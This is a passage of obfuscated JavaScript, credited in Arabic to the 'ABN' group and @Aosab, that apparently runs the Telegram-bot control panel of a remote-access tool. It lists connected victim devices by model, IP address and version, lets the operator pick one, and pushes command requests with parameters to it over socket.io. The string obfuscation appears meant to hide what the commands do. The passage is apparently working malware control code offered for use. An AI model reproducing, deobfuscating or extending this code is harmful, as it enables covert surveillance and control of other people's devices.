            'arjOK': _0x5e45b8(0x3f5) + _0x5e45b8(0x311) + '\x20✯',
            'twgFo': _0x5e45b8(0x2d6),
            'uvVuL': _0x5e45b8(0x28d),
            'sSnbi': _0x5e45b8(0x23e) + _0x5e45b8(0x266) + _0x5e45b8(0x35f) + _0x5e45b8(0x3cf) + _0x5e45b8(0x235) + _0x5e45b8(0x390) + _0x5e45b8(0x32f) + _0x5e45b8(0x20f) + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』',
            'WpXBx': function (_0x40162f, _0x42c2e3) {
                return _0x40162f === _0x42c2e3;
            },
            'yJQuh': _0x5e45b8(0x324),
            'SRsQE': _0x5e45b8(0x20b),
            'IwwrQ': function (_0x5d08d2, _0x10a432) {
                return _0x5d08d2 === _0x10a432;
            },
            'rWKOo': _0x5e45b8(0x3f7),
            'kLiWJ': function (_0x1aa915, _0x4f5ce6) {
                return _0x1aa915 === _0x4f5ce6;
            },
            'tRUQf': _0x5e45b8(0x3ce) + _0x5e45b8(0x2f8),
            'yCtVW': _0x5e45b8(0x218),
            'gFnRT': _0x5e45b8(0x216) + _0x5e45b8(0x2a2),
            'ACIIr': _0x5e45b8(0x3ac) + _0x5e45b8(0x2ee),
            'xAfCt': _0x5e45b8(0x2b0) + _0x5e45b8(0x3c7),
            'FahaN': _0x5e45b8(0x26b) + _0x5e45b8(0x32e) + _0x5e45b8(0x27f),
            'fwwLa': _0x5e45b8(0x2b0) + _0x5e45b8(0x2aa),
            'HXPAl': function (_0x4c09b0, _0x457872) {
                return _0x4c09b0 === _0x457872;
            },
            'xwfKC': _0x5e45b8(0x23c) + _0x5e45b8(0x2f8),
            'xjphE': _0x5e45b8(0x1f5),
            'maoyn': function (_0x37ee44, _0x46e52e) {
                return _0x37ee44 === _0x46e52e;
            },
            'aOTNV': _0x5e45b8(0x296) + _0x5e45b8(0x257) + _0x5e45b8(0x22a),
            'PHOyW': function (_0x21259b, _0x134628) {
                return _0x21259b === _0x134628;
            },
            'COyLT': function (_0x17249e, _0x5d172c) {
                return _0x17249e === _0x5d172c;
            },
            'QgDqS': _0x5e45b8(0x296) + _0x5e45b8(0x257) + _0x5e45b8(0x38e),
            'LMUpv': _0x5e45b8(0x2bb) + _0x5e45b8(0x3fd) + _0x5e45b8(0x34a) + _0x5e45b8(0x3d2) + '\x0a\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』',
            'klyVw': _0x5e45b8(0x21e) + _0x5e45b8(0x37e) + _0x5e45b8(0x285) + _0x5e45b8(0x24b) + _0x5e45b8(0x292) + _0x5e45b8(0x3c3) + _0x5e45b8(0x22b) + _0x5e45b8(0x357) + _0x5e45b8(0x3da) + _0x5e45b8(0x3ee) + _0x5e45b8(0x289) + _0x5e45b8(0x1f7) + _0x5e45b8(0x2cf) + _0x5e45b8(0x322) + _0x5e45b8(0x286) + _0x5e45b8(0x2dc),
            'bUOIn': _0x5e45b8(0x20c) + _0x5e45b8(0x355) + _0x5e45b8(0x398),
            'wcqGN': function (_0x689151, _0x17c6f7) {
                return _0x689151 === _0x17c6f7;
            },
            'OQizW': _0x5e45b8(0x35c) + _0x5e45b8(0x2c3) + _0x5e45b8(0x204),
            'RSweu': _0x5e45b8(0x39d),
            'MQeYG': _0x5e45b8(0x385),
            'MZPUm': _0x5e45b8(0x2f0),
            'FxUCM': _0x5e45b8(0x25f),
            'qmSqi': function (_0x469919, _0x2160f4) {
                return _0x469919 === _0x2160f4;
            },
            'FwqNA': _0x5e45b8(0x314) + 'a',
            'SSCYa': _0x5e45b8(0x242) + _0x5e45b8(0x30a),
            'LexPl': _0x5e45b8(0x38d),
            'fzeQJ': _0x5e45b8(0x276),
            'dFxqG': _0x5e45b8(0x263) + 'on',
            'tGgwm': function (_0x38ead8, _0x2adde1) {
                return _0x38ead8 === _0x2adde1;
            },
            'mSeFE': _0x5e45b8(0x263) + _0x5e45b8(0x383),
            'zjpbR': function (_0x514237, _0x4d25d2) {
                return _0x514237 === _0x4d25d2;
            },
            'pyhJJ': _0x5e45b8(0x306) + _0x5e45b8(0x31e),
            'bvHyo': function (_0x429280, _0x238aae) {
                return _0x429280 === _0x238aae;
            },
            'vgQYv': _0x5e45b8(0x36f),
            'HBeIo': function (_0x44c429, _0x18f4b7) {
                return _0x44c429 === _0x18f4b7;
            },
            'AeQsn': function (_0x4cb84b, _0x1f08d7) {
                return _0x4cb84b === _0x1f08d7;
            },
            'VcAKd': _0x5e45b8(0x258) + _0x5e45b8(0x2e5) + _0x5e45b8(0x21d) + _0x5e45b8(0x2c4) + _0x5e45b8(0x360) + _0x5e45b8(0x22e),
            'oibGt': function (_0x288bab, _0xf51b82) {
                return _0x288bab === _0xf51b82;
            },
            'KRrbd': _0x5e45b8(0x21f) + _0x5e45b8(0x30e) + _0x5e45b8(0x3cc) + _0x5e45b8(0x3ab) + _0x5e45b8(0x2c5) + _0x5e45b8(0x331) + _0x5e45b8(0x3f3) + _0x5e45b8(0x284) + _0x5e45b8(0x249) + _0x5e45b8(0x3db) + _0x5e45b8(0x20f) + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』',
            'fJCtm': function (_0x318895, _0x167516) {
                return _0x318895 === _0x167516;
            },
            'DMvqW': function (_0x4dea96, _0x4f2ceb, _0x5cafcf, _0x47bcca) {
                return _0x4dea96(_0x4f2ceb, _0x5cafcf, _0x47bcca);
            },
            'hGhIS': _0x5e45b8(0x3f9) + _0x5e45b8(0x226) + _0x5e45b8(0x29f) + _0x5e45b8(0x244) + '\x0a\x0a\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』',
            'FrrOE': function (_0x541129, _0x554a0d) {
                return _0x541129 === _0x554a0d;
            },
            'ARLCP': _0x5e45b8(0x3f9) + _0x5e45b8(0x375) + _0x5e45b8(0x219) + _0x5e45b8(0x20f) + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』',
            'lKTya': function (_0x3c3f2b, _0x241e8c) {
                return _0x3c3f2b === _0x241e8c;
            },
            'CDNjl': _0x5e45b8(0x2b2) + _0x5e45b8(0x37d) + _0x5e45b8(0x200) + _0x5e45b8(0x3a5) + _0x5e45b8(0x400) + _0x5e45b8(0x317) + _0x5e45b8(0x206) + '\x0a\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』',
            'TuXFO': _0x5e45b8(0x2d0),
            'YjyYm': function (_0x4275bd, _0x16e928) {
                return _0x4275bd === _0x16e928;
            },
            'WJvpz': _0x5e45b8(0x258) + _0x5e45b8(0x2ae) + _0x5e45b8(0x294) + _0x5e45b8(0x346) + _0x5e45b8(0x3c6) + _0x5e45b8(0x20f) + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』',
            'KwSVR': function (_0x457bef, _0x363ece) {
                return _0x457bef === _0x363ece;
            },
            'rUqqo': _0x5e45b8(0x258) + _0x5e45b8(0x2ae) + _0x5e45b8(0x361) + _0x5e45b8(0x344) + _0x5e45b8(0x3b0) + _0x5e45b8(0x20f) + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』',
            'hsPOD': _0x5e45b8(0x302) + 'e',
            'hdAIF': _0x5e45b8(0x28c) + _0x5e45b8(0x340) + _0x5e45b8(0x271) + _0x5e45b8(0x33c) + _0x5e45b8(0x22e) + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』'
        };
    if (_0x39eaaf[_0x5e45b8(0x3ec)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x26d)]))
        bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x205)](_0x39eaaf[_0x5e45b8(0x29e)](_0x39eaaf[_0x5e45b8(0x32a)], _0x39eaaf[_0x5e45b8(0x2c0)]), _0x39eaaf[_0x5e45b8(0x20a)]) + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
            'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
            'reply_markup': {
                'keyboard': [
                    [
                        _0x39eaaf[_0x5e45b8(0x3a1)],
                        _0x39eaaf[_0x5e45b8(0x3e3)]
                    ],
                    [_0x39eaaf[_0x5e45b8(0x37c)]]
                ],
                'resize_keyboard': !![]
            }
        });
    else {
        if (_0x39eaaf[_0x5e45b8(0x30c)](appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x3e0)]), _0x39eaaf[_0x5e45b8(0x243)])) {
            let _0x1a6221 = _0x517bec[_0x5e45b8(0x3ea)], _0x177892 = appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x30d)]);
            io['to'](_0x177892)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
                'request': _0x39eaaf[_0x5e45b8(0x2ff)],
                'extras': [{
                        'key': _0x39eaaf[_0x5e45b8(0x3a8)],
                        'value': _0x1a6221
                    }]
            }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x3e0)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)] + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                'reply_markup': {
                    'keyboard': [
                        [
                            _0x39eaaf[_0x5e45b8(0x3a1)],
                            _0x39eaaf[_0x5e45b8(0x3e3)]
                        ],
                        [_0x39eaaf[_0x5e45b8(0x37c)]]
                    ],
                    'resize_keyboard': !![]
                }
            });
        } else {
            if (_0x39eaaf[_0x5e45b8(0x30c)](appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x3e0)]), _0x39eaaf[_0x5e45b8(0x3df)])) {
                let _0x11ad45 = _0x517bec[_0x5e45b8(0x3ea)], _0x90e23e = appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x30d)]);
                io['to'](_0x90e23e)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
                    'request': _0x39eaaf[_0x5e45b8(0x2ce)],
                    'extras': [{
                            'key': _0x39eaaf[_0x5e45b8(0x25e)],
                            'value': _0x11ad45
                        }]
                }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x3e0)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)] + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
                    'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                    'reply_markup': {
                        'keyboard': [
                            [
                                _0x39eaaf[_0x5e45b8(0x3a1)],
                                _0x39eaaf[_0x5e45b8(0x3e3)]
                            ],
                            [_0x39eaaf[_0x5e45b8(0x37c)]]
                        ],
                        'resize_keyboard': !![]
                    }
                });
            }
        }
    }
    if (_0x39eaaf[_0x5e45b8(0x30c)](appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x3e0)]), _0x39eaaf[_0x5e45b8(0x38f)])) {
        let _0x47ae3a = _0x517bec[_0x5e45b8(0x3ea)];
        appData[_0x5e45b8(0x3fe)](_0x39eaaf[_0x5e45b8(0x29d)], _0x47ae3a), appData[_0x5e45b8(0x3fe)](_0x39eaaf[_0x5e45b8(0x3e0)], _0x39eaaf[_0x5e45b8(0x2b5)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x5e45b8(0x396) + _0x5e45b8(0x2fb) + _0x5e45b8(0x2e4) + _0x5e45b8(0x2d3) + _0x5e45b8(0x36c) + _0x5e45b8(0x3bd) + _0x47ae3a + _0x5e45b8(0x20f) + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
            'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
            'reply_markup': {
                'keyboard': [[_0x39eaaf[_0x5e45b8(0x260)]]],
                'resize_keyboard': !![],
                'one_time_keyboard': !![]
            }
        });
    } else {
        if (_0x39eaaf[_0x5e45b8(0x3ec)](appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x3e0)]), _0x39eaaf[_0x5e45b8(0x2b5)])) {
            let _0x24ed4e = _0x517bec[_0x5e45b8(0x3ea)], _0x3d83d5 = appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x29d)]), _0x1c5ece = appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x30d)]);
            io['to'](_0x1c5ece)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
                'request': _0x39eaaf[_0x5e45b8(0x3b5)],
                'extras': [
                    {
                        'key': _0x39eaaf[_0x5e45b8(0x217)],
                        'value': _0x3d83d5
                    },
                    {
                        'key': _0x39eaaf[_0x5e45b8(0x25e)],
                        'value': _0x24ed4e
                    }
                ]
            }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x3e0)]), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x29d)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x222)] + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                'reply_markup': {
                    'keyboard': [
                        [
                            _0x39eaaf[_0x5e45b8(0x3a1)],
                            _0x39eaaf[_0x5e45b8(0x3e3)]
                        ],
                        [_0x39eaaf[_0x5e45b8(0x37c)]]
                    ],
                    'resize_keyboard': !![]
                }
            });
        } else {
            if (_0x39eaaf[_0x5e45b8(0x38b)](appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x3e0)]), _0x39eaaf[_0x5e45b8(0x207)])) {
                let _0x7aa3c7 = _0x517bec[_0x5e45b8(0x3ea)];
                appData[_0x5e45b8(0x3fe)](_0x39eaaf[_0x5e45b8(0x29d)], _0x7aa3c7), appData[_0x5e45b8(0x3fe)](_0x39eaaf[_0x5e45b8(0x3e0)], _0x39eaaf[_0x5e45b8(0x297)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x5e45b8(0x258) + _0x5e45b8(0x2ae) + _0x5e45b8(0x294) + _0x5e45b8(0x346) + _0x7aa3c7 + _0x5e45b8(0x20f) + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
                    'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                    'reply_markup': {
                        'keyboard': [[_0x39eaaf[_0x5e45b8(0x260)]]],
                        'resize_keyboard': !![],
                        'one_time_keyboard': !![]
                    }
                });
            } else {
                if (_0x39eaaf[_0x5e45b8(0x354)](appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x3e0)]), _0x39eaaf[_0x5e45b8(0x297)])) {
                    let _0x3deca2 = _0x517bec[_0x5e45b8(0x3ea)], _0x3e88f9 = appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x29d)]), _0x30d107 = appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x30d)]);
                    io['to'](_0x30d107)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
                        'request': _0x39eaaf[_0x5e45b8(0x24e)],
                        'extras': [
                            {
                                'key': _0x39eaaf[_0x5e45b8(0x217)],
                                'value': _0x3e88f9
                            },
                            {
                                'key': _0x39eaaf[_0x5e45b8(0x25e)],
                                'value': _0x3deca2
                            }
                        ]
                    }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x3e0)]), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x29d)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)] + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
                        'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                        'reply_markup': {
                            'keyboard': [
                                [
                                    _0x39eaaf[_0x5e45b8(0x3a1)],
                                    _0x39eaaf[_0x5e45b8(0x3e3)]
                                ],
                                [_0x39eaaf[_0x5e45b8(0x37c)]]
                            ],
                            'resize_keyboard': !![]
                        }
                    });
                } else {
                    if (_0x39eaaf[_0x5e45b8(0x379)](appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x3e0)]), _0x39eaaf[_0x5e45b8(0x212)])) {
                        let _0x43c616 = _0x517bec[_0x5e45b8(0x3ea)], _0x3bd550 = appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x30d)]);
                        io['to'](_0x3bd550)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
                            'request': _0x39eaaf[_0x5e45b8(0x335)],
                            'extras': [{
                                    'key': _0x39eaaf[_0x5e45b8(0x3a8)],
                                    'value': _0x43c616
                                }]
                        }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x3e0)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)] + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
                            'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                            'reply_markup': {
                                'keyboard': [
                                    [
                                        _0x39eaaf[_0x5e45b8(0x3a1)],
                                        _0x39eaaf[_0x5e45b8(0x3e3)]
                                    ],
                                    [_0x39eaaf[_0x5e45b8(0x37c)]]
                                ],
                                'resize_keyboard': !![]
                            }
                        });
                    } else {
                        if (_0x39eaaf[_0x5e45b8(0x379)](appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x3e0)]), _0x39eaaf[_0x5e45b8(0x3ed)])) {
                            let _0x252791 = _0x517bec[_0x5e45b8(0x3ea)], _0x2bee9a = appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x30d)]);
                            io['to'](_0x2bee9a)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
                                'request': _0x39eaaf[_0x5e45b8(0x402)],
                                'extras': [{
                                        'key': _0x39eaaf[_0x5e45b8(0x25e)],
                                        'value': _0x252791
                                    }]
                            }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x3e0)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)] + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                'reply_markup': {
                                    'keyboard': [
                                        [
                                            _0x39eaaf[_0x5e45b8(0x3a1)],
                                            _0x39eaaf[_0x5e45b8(0x3e3)]
                                        ],
                                        [_0x39eaaf[_0x5e45b8(0x37c)]]
                                    ],
                                    'resize_keyboard': !![]
                                }
                            });
                        } else {
                            if (_0x39eaaf[_0x5e45b8(0x354)](appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x3e0)]), _0x39eaaf[_0x5e45b8(0x40c)])) {
                                let _0x3460aa = _0x517bec[_0x5e45b8(0x3ea)];
                                appData[_0x5e45b8(0x3fe)](_0x39eaaf[_0x5e45b8(0x34e)], _0x3460aa), appData[_0x5e45b8(0x3fe)](_0x39eaaf[_0x5e45b8(0x3e0)], _0x39eaaf[_0x5e45b8(0x250)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x5e45b8(0x396) + _0x5e45b8(0x252) + _0x5e45b8(0x341) + _0x5e45b8(0x34b) + _0x5e45b8(0x3d8) + _0x5e45b8(0x21a) + _0x5e45b8(0x32d) + '\x0a\x0a\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
                                    'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                    'reply_markup': {
                                        'keyboard': [[_0x39eaaf[_0x5e45b8(0x260)]]],
                                        'resize_keyboard': !![],
                                        'one_time_keyboard': !![]
                                    }
                                });
                            } else {
                                if (_0x39eaaf[_0x5e45b8(0x221)](appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x3e0)]), _0x39eaaf[_0x5e45b8(0x250)])) {
                                    let _0xa5296c = _0x517bec[_0x5e45b8(0x3ea)], _0x46fa42 = appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x34e)]), _0x5c16e6 = appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x30d)]);
                                    io['to'](_0x5c16e6)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
                                        'request': _0x39eaaf[_0x5e45b8(0x2d7)],
                                        'extras': [
                                            {
                                                'key': _0x39eaaf[_0x5e45b8(0x25e)],
                                                'value': _0x46fa42
                                            },
                                            {
                                                'key': _0x39eaaf[_0x5e45b8(0x2e6)],
                                                'value': _0xa5296c
                                            }
                                        ]
                                    }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x3e0)]), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x34e)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)] + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
                                        'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                        'reply_markup': {
                                            'keyboard': [
                                                [
                                                    _0x39eaaf[_0x5e45b8(0x3a1)],
                                                    _0x39eaaf[_0x5e45b8(0x3e3)]
                                                ],
                                                [_0x39eaaf[_0x5e45b8(0x37c)]]
                                            ],
                                            'resize_keyboard': !![]
                                        }
                                    });
                                } else {
                                    if (_0x39eaaf[_0x5e45b8(0x3ec)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x3a1)])) {
                                        if (_0x39eaaf[_0x5e45b8(0x362)](io[_0x5e45b8(0x3c1)][_0x5e45b8(0x3c1)][_0x5e45b8(0x3c5)], 0x1bc3 + -0xa7f + -0x451 * 0x4))
                                            bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x409)] + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', { 'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)] });
                                        else {
                                            let _0x21861d = _0x5e45b8(0x313) + _0x5e45b8(0x3e9) + _0x5e45b8(0x353) + io[_0x5e45b8(0x3c1)][_0x5e45b8(0x3c1)][_0x5e45b8(0x3c5)] + _0x5e45b8(0x20f) + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', _0x552593 = -0x1541 + 0xf9a + -0xb5 * -0x8;
                                            io[_0x5e45b8(0x3c1)][_0x5e45b8(0x3c1)][_0x5e45b8(0x35e)]((_0x58299b, _0x5483ae, _0x9193a2) => {
                                                const _0x562ec8 = _0x5e45b8;
                                                _0x21861d += _0x39eaaf[_0x562ec8(0x29e)](_0x39eaaf[_0x562ec8(0x205)](_0x39eaaf[_0x562ec8(0x29e)](_0x39eaaf[_0x562ec8(0x29e)](_0x562ec8(0x1f8) + _0x552593 + _0x562ec8(0x3e4), _0x562ec8(0x33b) + _0x562ec8(0x236) + _0x58299b[_0x562ec8(0x3a6)] + '\x0a'), _0x562ec8(0x387) + _0x562ec8(0x2e3) + '→\x20' + _0x58299b[_0x562ec8(0x272)] + '\x0a'), _0x562ec8(0x40b) + '→\x20' + _0x58299b['ip'] + '\x0a'), _0x562ec8(0x2ec) + _0x562ec8(0x2f5) + _0x58299b[_0x562ec8(0x327)][_0x562ec8(0x351)] + '\x0a\x0a\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』'), _0x552593 += -0x1 * -0x78d + 0x1 * -0x102c + 0x8a * 0x10;
                                            }), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x21861d, { 'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)] });
                                        }
                                    } else {
                                        if (_0x39eaaf[_0x5e45b8(0x256)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x3e3)])) {
                                            if (_0x39eaaf[_0x5e45b8(0x264)](io[_0x5e45b8(0x3c1)][_0x5e45b8(0x3c1)][_0x5e45b8(0x3c5)], 0x2220 + -0x13d8 * -0x1 + 0x16 * -0x274))
                                                bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x22f)] + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', { 'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)] });
                                            else {
                                                let _0x1075d0 = [];
                                                io[_0x5e45b8(0x3c1)][_0x5e45b8(0x3c1)][_0x5e45b8(0x35e)]((_0x30f158, _0x115073, _0x3e22bd) => {
                                                    const _0x1c0603 = _0x5e45b8;
                                                    _0x1075d0[_0x1c0603(0x278)]([_0x30f158[_0x1c0603(0x3a6)]]);
                                                }), _0x1075d0[_0x5e45b8(0x278)]([_0x39eaaf[_0x5e45b8(0x225)]]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x34d)] + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
                                                    'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                    'reply_markup': {
                                                        'keyboard': _0x1075d0,
                                                        'resize_keyboard': !![],
                                                        'one_time_keyboard': !![]
                                                    }
                                                });
                                            }
                                        } else {
                                            if (_0x39eaaf[_0x5e45b8(0x30c)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x37c)]))
                                                bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x2cb)] + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', { 'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)] });
                                            else {
                                                if (_0x39eaaf[_0x5e45b8(0x221)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x225)]))
                                                    bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x367)] + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
                                                        'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                        'reply_markup': {
                                                            'keyboard': [
                                                                [
                                                                    _0x39eaaf[_0x5e45b8(0x3a1)],
                                                                    _0x39eaaf[_0x5e45b8(0x3e3)]
                                                                ],
                                                                [_0x39eaaf[_0x5e45b8(0x37c)]]
                                                            ],
                                                            'resize_keyboard': !![]
                                                        }
                                                    });
                                                else {
                                                    if (_0x39eaaf[_0x5e45b8(0x2a4)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x260)])) {
                                                        let _0x20b5f2 = io[_0x5e45b8(0x3c1)][_0x5e45b8(0x3c1)][_0x5e45b8(0x214)](appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x30d)]))[_0x5e45b8(0x3a6)];
